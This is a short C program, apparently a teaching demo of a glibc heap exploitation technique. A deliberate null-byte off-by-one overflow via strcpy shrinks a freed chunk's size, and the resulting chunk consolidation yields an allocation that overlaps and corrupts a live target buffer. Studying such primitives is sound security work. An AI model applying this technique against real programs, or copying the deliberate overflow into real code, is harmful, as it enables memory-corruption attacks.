  #include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(){
char *V = (char*)malloc(0x18); //vulnerable object
  void *A = malloc(0x400); // chunk size 0x410, not fastbin
  void *B = malloc(0xf0); // chunk size 0x100, not fastbin
  free(A);
  strcpy(V, "AAAAAAAAAAAAAAAAAAAAAAAA"); //null byte off by 1, shrink size of Ato 0x400
  void *A1 = malloc(0xf0);
  char *T = (char*)malloc(0x10); // target
  strcpy(T, "Target");
  printf("T: %s\n", T);
  free(A1);
  free(B); // force consolidation with A1
  char *C = (char*)malloc(0x400); // mallocC, overlapping T
  strcpy(C+0x100, "Corrupted!"); 
  printf("T: %s\n", T);
  return 0;
}
